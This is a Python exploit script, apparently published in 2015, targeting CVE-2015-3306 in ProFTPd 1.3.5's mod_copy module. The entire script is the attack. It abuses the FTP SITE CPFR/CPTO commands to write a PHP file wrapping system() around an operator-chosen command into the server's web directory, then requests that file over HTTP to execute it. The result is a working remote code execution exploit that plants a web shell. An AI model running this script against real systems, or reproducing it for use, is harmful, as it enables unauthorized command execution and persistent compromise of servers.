# Title: ProFTPd 1.3.5 Remote Command Execution
# Date : 20/04/2015
# Author: R-73eN
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux 1.06
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work .
import socket
import sys
import requests
#Banner
banner = ""
banner += "  ___        __        ____                 _    _  \n"
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if(len(sys.argv) < 4):
    print '\n Usage : exploit.py server directory cmd'
else:
	server = sys.argv[1] #Vulnerable Server
	directory = sys.argv[2] # Path accessible from web .....
	cmd = sys.argv[3] #PHP payload to be executed
	evil = '<?php system("' + cmd + '") ?>'
	s.connect((server, 21))
	s.recv(1024)
	print '[ + ] Connected to server [ + ] \n'
	s.send('site cpfr /etc/passwd')
	s.recv(1024)
	s.send('site cpto ' + evil)
	s.recv(1024)
	s.send('site cpfr /proc/self/fd/3')
	s.recv(1024)
	s.send('site cpto ' + directory + 'infogen.php')
	s.recv(1024)
	s.close()
	print '[ + ] Payload sended [ + ]\n'
	print '[ + ] Executing Payload [ + ]\n'
	r = requests.get('http://' + server + '/infogen.php') #Executing PHP payload through HTTP
	if (r.status_code == 200):
		print '[ * ] Payload Executed Succesfully [ * ]'
	else:
		print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'

print '\n http://infogen.al/'